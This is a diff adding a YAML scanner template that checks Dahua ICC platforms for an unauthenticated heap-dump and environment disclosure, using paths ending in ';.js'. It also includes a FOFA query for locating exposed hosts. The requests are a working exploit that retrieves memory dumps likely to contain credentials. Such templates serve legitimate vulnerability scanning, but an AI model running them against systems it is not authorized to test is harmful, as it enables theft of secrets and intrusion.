@@ -1,0 +1,40 @@
+id: dahua-icc-dsc-mac-disclosure
+info:
+  name: 大华 ICC 智能物联综合管理平台 heapdump - 敏感信息泄露
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E5%A4%A7%E5%8D%8E/%E5%A4%A7%E5%8D%8EICC%E6%99%BA%E8%83%BD%E7%89%A9%E8%81%94%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0heapdump%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.md
+    - https://github.com/CRlife/Rscan/blob/0edbf44689fbc876294a7d8603639dfe44fabeee/poc/yaml-poc/poc-yaml-%E5%A4%A7%E5%8D%8EICC-heapdump-leak.yaml
+  metadata:
+    verified: true
+    fofa-query: body="static/fontshd/font-hd.css" || body="客户端会小于800"
+    tips: heapdump path /evo-apigw/dsc-mac/heapdump;.js
+  tags: icc,dahua,disclosure,iot
+
+
+http:
+  - raw:
+      - |
+        GET /evo-apigw/dsc-mac/env;.js HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,'java.version')
+        condition: and
+      
+  - raw:
+      - |
+        GET /evo-apigw/dsc-mac/heapdump;.js HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(header,'application/octet-stream')
+        condition: and
